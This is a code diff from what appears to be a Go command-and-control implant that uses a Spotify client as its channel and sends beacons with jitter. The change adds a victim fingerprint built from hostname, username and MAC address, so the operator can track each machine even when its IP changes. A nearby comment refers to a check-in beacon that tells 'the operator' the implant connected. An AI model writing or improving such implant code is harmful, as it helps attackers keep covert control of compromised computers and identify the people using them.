@@ -49,15 +49,30 @@ func NewImplant(client *spotify.Client, key string, interval, jitter int) *Impla
 	}
 }
 
-// getClientID returns Adler32 hash of primary IP as hex string.
+// getClientID returns Adler32 hash of hostname+user+MAC for a stable,
+// unique-per-machine identifier regardless of IP changes.
 func getClientID() string {
-	conn, err := net.Dial("udp", "8.8.8.8:80")
-	ip := "127.0.0.1"
-	if err == nil {
-		ip = conn.LocalAddr().(*net.UDPAddr).IP.String()
-		conn.Close()
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = "unknown"
 	}
-	return fmt.Sprintf("%08x", adler32.Checksum([]byte(ip)))
+
+	// Get first non-loopback MAC address
+	mac := "no-mac"
+	ifaces, err := net.Interfaces()
+	if err == nil {
+		for _, iface := range ifaces {
+			if iface.Flags&net.FlagLoopback != 0 || len(iface.HardwareAddr) == 0 {
+				continue
+			}
+			mac = iface.HardwareAddr.String()
+			break
+		}
+	}
+
+	seed := hostname + "|" + username + "|" + mac
+	return fmt.Sprintf("%08x", adler32.Checksum([]byte(seed)))
 }
 
 // sendCheckin sends a check-in beacon so the operator knows we connected.
